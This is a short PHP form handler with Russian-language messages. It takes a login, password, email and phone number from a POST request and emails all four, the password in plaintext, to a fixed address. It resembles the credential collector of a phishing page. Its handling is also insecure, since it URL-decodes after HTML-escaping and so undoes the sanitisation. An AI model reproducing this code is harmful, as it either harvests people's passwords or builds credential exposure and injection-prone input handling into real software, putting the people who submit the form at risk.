<?php

  $login = $_POST['login'];
  $pass = $_POST['pass'];
  $email = $_POST['email'];
  $tel = $_POST['tel'];





  $login = htmlspecialchars($login);
  $pass = htmlspecialchars($pass);
  $email = htmlspecialchars($email);
  $tel = htmlspecialchars($tel);


  $login = urldecode($login);
  $pass = urldecode($pass);
  $email = urldecode($email);
  $tel = urldecode($tel);



  $login = trim($login);
  $pass = trim($pass);
  $email = trim($email);
  $tel = trim($tel);


  if(mail("admin@mail.com",
          "Новое письмо с сайта",
          "Логин: ".$login."\n".
          "Пароль: ".$pass."\n".
          "Email: ".$email."\n".
          "Телефон: ".$tel,
          "From: idibektnu@gmail.com \r\n")
) {
    echo ('Письмо успешно отправлено!');
}
else {
    echo ('Есть ошибки! Проверьте данные...');
}
?>